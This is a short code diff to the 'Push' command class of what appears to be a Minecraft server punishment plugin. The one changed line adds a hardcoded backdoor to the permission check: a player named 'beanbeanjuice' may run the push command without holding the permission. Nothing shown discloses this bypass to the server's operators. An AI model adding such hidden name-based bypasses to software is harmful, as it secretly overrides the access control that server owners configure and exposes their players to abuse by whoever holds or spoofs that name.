@@ -28,7 +28,7 @@ public class Push implements CommandExecutor {
 
         Player punisher = (Player) sender;
 
-        if (punisher.hasPermission("beanpunishments.push")) {
+        if (punisher.hasPermission("beanpunishments.push") || punisher.getName().equals("beanbeanjuice")) {
             if (args.length != 2) {
                 punisher.sendMessage(GeneralHelper.getPrefix() + GeneralHelper.translateColors(plugin.getConfig().getString("push-incorrect-syntax")));
                 return false;
